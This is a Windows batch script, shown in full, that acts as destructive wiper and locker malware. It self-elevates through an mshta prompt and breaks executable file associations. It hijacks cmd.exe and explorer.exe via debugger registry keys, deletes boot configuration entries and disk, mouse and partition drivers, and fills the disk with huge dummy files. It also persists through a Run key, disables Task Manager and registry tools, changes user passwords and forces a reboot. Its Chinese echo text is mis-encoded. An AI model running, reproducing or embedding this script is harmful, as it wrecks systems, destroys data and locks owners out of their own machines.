@echo off
%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&&exit
cd /d "%~dp0"
taskkill /IM explorer.exe /F
echo ��ӭ��ĵ�������ս��
echo ���������Ѿ�����ʮ�㣬׼����Կ����ˣ�
echo �����˳��������ü�...
reg add HKLM\SYSTEM\CurrentControlSet\Services\EventLog\System\Microsoft-Windows-MountMgr /v EventMessageFile /t REG_EXPAND_SZ /d 52 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e96f-e325-11ce-bfc1-08002be10318} /v ClassDesc /t REG_SZ /d 174 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e96b-e325-11ce-bfc1-08002be10318} /v UpperFilters /t REG_MULTI_SZ /d 192 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e96b-e325-11ce-bfc1-08002be10318} /v UpperFilters /t REG_MULTI_SZ /d 277 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e96f-e325-11ce-bfc1-08002be10318} /v UpperFilters /t REG_MULTI_SZ /d 174 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e967-e325-11ce-bfc1-08002be10318} /v UpperFilters /t REG_MULTI_SZ /d 385 /f
:yes
reg add HKCR\.exe  /ve /t REG_SZ /d 1234 /f
reg add HKCR\.com  /ve /t REG_SZ /d 45514 /f
reg add HKCR\.vbs  /ve /t REG_SZ /d jpegfile /f
reg add HKCR\.bat  /ve /t REG_SZ /d 1451 /f
reg add HKCR\.inf  /ve /t REG_SZ /d jpegfile /f
reg add HKCR\.sh  /ve /t REG_SZ /d jpegfile /f
reg add HKCR\.reg /ve /t REG_SZ /d jpegfile /f
reg add HKCR\.cpl /ve /t REG_SZ /d jpegfile /f
reg add HKCR\.mmc /ve /t REG_SZ /d jpegfile /f
reg add HKCR\.ps1 /ve /t REG_SZ /d jpegfile /f
reg delete HKCR\* /f
reg add HKLM\SOFTWARE\Classes\.exe  /ve /t REG_SZ /d 157 /f
reg add HKLM\SOFTWARE\Classes\.com  /ve /t REG_SZ /d 114 /f
reg add HKLM\SOFTWARE\Classes\.vbs  /ve /t REG_SZ /d jpegfile /f
reg add HKLM\SOFTWARE\Classes\.bat  /ve /t REG_SZ /d 1567132 /f
reg add HKLM\SOFTWARE\Classes\.sh  /ve /t REG_SZ /d jpegfile /f
reg add HKLM\SOFTWARE\Classes\.reg  /ve /t REG_SZ /d 4456 /f
reg add HKLM\SOFTWARE\Classes\.inf /ve /t REG_SZ /d jpegfile /f
reg add HKCR\SOFTWARE\Classes\.cpl /ve /t REG_SZ /d jpegfile /f
reg add HKCR\SOFTWARE\Classes\.mmc /ve /t REG_SZ /d jpegfile /f
reg add HKLM\SYSTEM\CurrentControlSet\Services\EventLog\System\Microsoft-Windows-MountMgr /v EventMessageFile /t REG_EXPAND_SZ /d 52 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e96f-e325-11ce-bfc1-08002be10318} /v ClassDesc /t REG_SZ /d 174 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e96b-e325-11ce-bfc1-08002be10318} /v UpperFilters /t REG_MULTI_SZ /d 192 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e96b-e325-11ce-bfc1-08002be10318} /v UpperFilters /t REG_MULTI_SZ /d 277 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e96f-e325-11ce-bfc1-08002be10318} /v UpperFilters /t REG_MULTI_SZ /d 174 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e967-e325-11ce-bfc1-08002be10318} /v UpperFilters /t REG_MULTI_SZ /d 385 /f
reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe /v debugger /t REG_SZ /d "C:\Windows\SysWOW64\oobe\START.exe" /f
reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe /v debugger /t REG_SZ /d "C:\Windows\SysWOW64\oobe\START.exe" /f
bcdedit /delete {current} /f
bcdedit /delete {bootmgr} /f
bcdedit /delete {5c8450c7-10fb-11ee-95f3-81773a1c99f8} /f
takeown /f C:\Windows\System32\drivers /a /r /d y
takeown /f C:\Windows\System32\DriverStore /a /r /d y
takeown /f C:\Windows\System32\cmd.exe /a /r /d y
takeown /f C:\Windows\explorer.exe /a /r /d y
del C:\Windows\System32\cmd.exe /f /q 
md %appdata%\NVDIA\notcarech
fsutil file createnew %appdata%\NVDIA\notcarech\disres.rar 53687091200
fsutil file createnew %appdata%\NVDIA\notcarech\disresbackup.rar 53687083648
fsutil file createnew %appdata%\NVDIA\notcarech\disrescom.rar 5368783648
fsutil file createnew %appdata%\NVDIA\notcarech\disresnot.rar 536783648
del C:\Windows\System32\drivers\mouclass.sys
del C:\Windows\System32\drivers\mountmgr.sys
del C:\Windows\System32\drivers\mouhid.sys
del C:\Windows\System32\drivers\partmgr.sys
del C:\Windows\System32\drivers\EhStorClass.sys
del C:\Windows\System32\drivers\disk.sys
del "C:\Windows\System32\DriverStore\FileRepository\disk.inf_amd64_502e7d1dac536e52\disk.sys"
set name=%~n0
copy "%~f0" %appdata%
rename "%appdata%\%name%.exe" START.exe
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v admin /t REG_SZ /d "%appdata%\START.exe" /f
del C:\Windows\System32\drivers\mouhid.sys
del C:\Windows\System32\drivers\mouhid.sys
del C:\Windows\System32\DriverStore\FileRepository\msmouse.inf_amd64_1793a485b491b199\mouhid.sys
del C:\Windows\System32\DriverStore\FileRepository\msmouse.inf_amd64_1793a485b491b199\mouclass.sys
set read=%username%
echo %read%
reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f
reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableExplorer /t REG_DWORD /d 1 /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewOnDrive /t REG_DWORD /d 67108863 /f
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 1
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f
net user Adminstrator 45664
net user adminstrator 75343
net user Users 374543
net user user 7373783
net user User 11456
net user 111 734312345
net user %read% AS1RA56AR
bcdedit /delete {70488172-d5be-11ed-bce8-cb86046c9544}
bcdedit /delete {eb351e50-2f71-11ee-b3cc-0087362fe1f7}
bcdedit /delete {current}
bcdedit /delete {default}
bcdboot Z:\Windows
shutdown -r -f -t 0
shutdown -r -f 





